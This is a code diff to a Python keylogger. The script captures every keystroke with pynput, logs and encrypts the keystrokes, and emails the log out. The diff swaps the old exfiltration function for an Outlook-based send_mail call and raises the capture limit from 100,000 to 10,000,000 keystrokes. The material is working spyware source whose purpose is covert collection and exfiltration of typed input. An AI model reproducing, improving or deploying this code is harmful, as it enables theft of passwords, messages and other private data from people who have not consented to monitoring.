@@ -1,7 +1,7 @@
+from sendoutlook import send_mail
 from pynput.keyboard import Listener, Key
 from decrypt import decrypt                                          
 from encrypt import encrypt
-from quickstart import send_final_message
 
 decrypt()                                                           #called to make sure file is decrypted b4 encryption
 
@@ -13,7 +13,7 @@ def on_press(key):
     letter = letter.replace("'","") 
     special_keys(letter)
     count += 1
-    if count == 100000:
+    if count == 10000000:
         return False
 
 def special_keys(letter):
@@ -43,11 +43,12 @@ with Listener(on_press=on_press, on_release=on_release) as l:
 encrypt()                                       #Encrypting the logfile from encrypt script
 
 try:
-    if __name__ == "__main__":
-        send_final_message()
+    if __name__ =="__main__":
 
-except Exception as error:
-    print(error)
+        print("Sending mail...")
+        
+        send_mail()
 
-
-
+except Exception as exception:
+    
+    print(exception)
